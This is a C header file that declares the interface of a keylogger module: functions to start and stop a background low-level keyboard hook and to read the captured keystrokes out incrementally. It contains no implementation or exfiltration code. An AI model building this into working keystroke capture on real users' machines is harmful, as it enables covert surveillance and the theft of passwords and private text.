#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <stddef.h>

#define KEYLOG_BUFFER_SIZE 65536

/* Start the low-level keyboard hook (spawns a background thread). Returns 0 on success. */
int keylogger_start(void);

/* Stop the hook and release resources. */
void keylogger_stop(void);

/* Copy collected keystrokes into buf (up to buf_len bytes).
   Returns bytes written. Advances the read cursor so repeated
   calls return incremental data. */
size_t keylogger_get_log(char *buf, size_t buf_len);

#endif /* KEYLOGGER_H */
